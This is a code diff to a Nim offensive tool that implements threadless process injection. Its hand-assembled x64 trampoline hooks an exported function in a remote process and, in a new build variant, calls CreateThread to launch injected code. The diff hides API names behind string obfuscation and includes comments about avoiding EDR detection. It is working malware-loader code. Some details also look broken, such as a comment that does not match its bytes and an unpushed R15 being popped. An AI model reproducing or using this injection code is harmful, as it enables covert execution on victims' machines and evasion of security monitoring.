@@ -37,8 +37,13 @@ let ThreadlessInjectStub * = """
 import cfgadd
 
 proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress: LPVOID): bool =
+    
+    when defined(threadlessthread):
+        var trampolineStk: array[115, byte]
+    else:
+        var trampolineStk: array[89, byte]
+    
     var 
-        trampolineStk: array[89, byte]
         trampSize: DWORD
         highBytePatched: DWORD64
         lowBytePatched: DWORD64
@@ -57,44 +62,87 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
         exportContent: LPVOID
         hookCalled: DWORD
 
-
-    
-    trampolineStk = [byte 0x58,                                     # pop RAX
-    0x48, 0x83, 0xe8, 0x0c,                                         # sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
-    0x50,                                                           # push RAX
-    0x55,                                                           # PUSH RBP
-    0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
-    0x48, 0x83, 0xec, 0x08,                                         # SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
-    0x53,                                                           # push RBX                         : just save the context registers
-    0x51,                                                           # push RCX                         
-    0x52,                                                           # push RDX
-    0x41, 0x50,                                                     # push R8
-    0x41, 0x51,                                                     # push R9
-    0x41, 0x52,                                                     # push R10
-    0x41, 0x53,                                                     # push R11
-    0x41, 0x54,                                                     # push R12
-    0x41, 0x55,                                                     # push R13
-    0x41, 0x56,                                                     # push R14
-    0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RCX, 0x0000000000000000   : restore the hooked function code
-    0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RDX, 0x0000000000000000   : restore the hooked function code
-    0x48, 0x89, 0x08,                                               # mov qword ptr[rax], rcx          : restore the hooked function code
-    0x48, 0x89, 0x50, 0x08,                                         # mov qword ptr[rax+0x8], rdx      : restore the hooked function code
-    0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
-    0xff, 0xd0,                                                     # call RAX                         : Call the malicious code
-    0x41, 0x5E,                                                     # pop R14                          : Restore the context
-    0x41, 0x5D,                                                     # pop R13
-    0x41, 0x5C,                                                     # pop R12
-    0x41, 0x5b,                                                     # pop R11                          : Restore the context
-    0x41, 0x5a,                                                     # pop R10
-    0x41, 0x59,                                                     # pop R9
-    0x41, 0x58,                                                     # pop R8
-    0x5a,                                                           # pop RDX
-    0x59,                                                           # pop RCX
-    0x5b,                                                           # pop RBX
-    0xc9,                                                           # leave
-    0xc3                                                            # ret   
-    ]
-    trampSize = 89
+    when defined(threadlessthread):
+        trampolineStk = [byte 0x58,                                     # pop RAX
+        0x48, 0x83, 0xe8, 0x0c,                                         # sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
+        0x50,                                                           # push RAX
+        0x55,                                                           # PUSH RBP
+        0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
+        0x48, 0x83, 0xec, 0x08,                                         # SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
+        0x53,                                                           # push RBX                         : just save the context registers
+        0x51,                                                           # push RCX
+        0x52,                                                           # push RDX
+        0x41, 0x50,                                                     # push R8
+        0x41, 0x51,                                                     # push R9
+        0x41, 0x52,                                                     # push R10
+        0x41, 0x53,                                                     # push R11
+        0x41, 0x54,                                                     # push R12
+        0x41, 0x55,                                                     # push R13
+        0x41, 0x56,                                                     # push R14
+        0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RCX, 0x0000000000000000   : restore the hooked function code
+        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RDX, 0x0000000000000000   : restore the hooked function code
+        0x48, 0x89, 0x08,                                               # mov qword ptr[rax], rcx          : restore the hooked function code
+        0x48, 0x89, 0x50, 0x08,                                         # mov qword ptr[rax+0x8], rdx      : restore the hooked function code
+        0x49, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs R8, 0x0000000000000000    : [trampolin 49] CreateThread start address
+        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RAX, 0x0000000000000000   : mov createthread addr at trampolin [59]
+        0x48, 0x31, 0xC9,                                               # xor RCX, RCX                    : CreateThread args
+        0x48, 0x31, 0xD2,                                               # xor RDX, RDX                    : CreateThread args
+        0x48, 0x83, 0xEC, 0xF0,                                         # sub RSP, 0FFFFFFFh: stack space for call
+        0xFF, 0xD0,                                                     # call RAX                         : Call CreateThread
+        0x48, 0x83, 0xC4, 0xF0,                                         # add RSP, 0FFFFFFFh: reset stack space
+        0x41, 0x5F,                                                     # pop R15                          : Restore the context
+        0x41, 0x5E,                                                     # pop R14
+        0x41, 0x5D,                                                     # pop R13
+        0x41, 0x5C,                                                     # pop R12
+        0x41, 0x5b,                                                     # pop R11                          : Restore the context
+        0x41, 0x5a,                                                     # pop R10
+        0x41, 0x59,                                                     # pop R9
+        0x41, 0x58,                                                     # pop R8
+        0x5a,                                                           # pop RDX
+        0x59,                                                           # pop RCX
+        0x5b,                                                           # pop RBX
+        0xc9,                                                           # leave
+        0xc3                                                            # ret
+        ]
+        trampSize = 115
+    else:
+  
+        trampolineStk = [byte 0x58,                                     # pop RAX
+        0x48, 0x83, 0xe8, 0x0c,                                         # sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
+        0x50,                                                           # push RAX
+        0x55,                                                           # PUSH RBP
+        0x48, 0x89, 0xE5,                                               # MOV RBP, RSP
+        0x48, 0x83, 0xec, 0x08,                                         # SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
+        0x53,                                                           # push RBX                         : just save the context registers
+        0x51,                                                           # push RCX                         
+        0x52,                                                           # push RDX
+        0x41, 0x50,                                                     # push R8
+        0x41, 0x51,                                                     # push R9
+        0x41, 0x52,                                                     # push R10
+        0x41, 0x53,                                                     # push R11
+        0x41, 0x54,                                                     # push R12
+        0x41, 0x55,                                                     # push R13
+        0x41, 0x56,                                                     # push R14
+        0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RCX, 0x0000000000000000   : restore the hooked function code
+        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # movabs RDX, 0x0000000000000000   : restore the hooked function code
+        0x48, 0x89, 0x08,                                               # mov qword ptr[rax], rcx          : restore the hooked function code
+        0x48, 0x89, 0x50, 0x08,                                         # mov qword ptr[rax+0x8], rdx      : restore the hooked function code
+        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     # mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
+        0xff, 0xd0,                                                     # call RAX                         : Call the malicious code
+        0x41, 0x5E,                                                     # pop R14                          : Restore the context
+        0x41, 0x5D,                                                     # pop R13
+        0x41, 0x5C,                                                     # pop R12
+        0x41, 0x5b,                                                     # pop R11                          : Restore the context
+        0x41, 0x5a,                                                     # pop R10
+        0x41, 0x59,                                                     # pop R9
+        0x41, 0x58,                                                     # pop R8
+        0x5a,                                                           # pop RDX
+        0x59,                                                           # pop RCX
+        0x5b,                                                           # pop RBX
+        0xc9,                                                           # leave
+        0xc3                                                            # ret   
+        ]
+        trampSize = 89
 
     highBytePatched = 0
     lowBytePatched = 0
@@ -146,6 +194,11 @@ proc threadlessThread*(processHandle: HANDLE, jumpAddress: LPVOID, exportAddress
     moveMemory(unsafeAddr trampolineStk[33], &highBytePatched, sizeof(DWORD64))
     moveMemory(unsafeAddr trampolineStk[43], &lowBytePatched, sizeof(DWORD64))
     moveMemory(unsafeAddr trampolineStk[60], unsafeAddr jumpAddress, sizeof(DWORD64))
+    when defined(threadlessthread):
+        # get the address of CreateThread via GetProcAddress/GetModuleHandle
+        var kernel32: HMODULE = GetModuleHandleA(obf("kernel32.dll"))
+        var createThread: LPVOID = GetProcAddress(kernel32, obf("CreateThread"))
+        moveMemory(unsafeAddr trampolineStk[70], unsafeAddr createThread, sizeof(DWORD64))
     # Write the trampoline somewhere in memory
     # Here VirtualAlloc is used, but some code cave can be used to limit this call
     # As the trampoline size is lesser than 4Ko, we should be ok for EDR detections
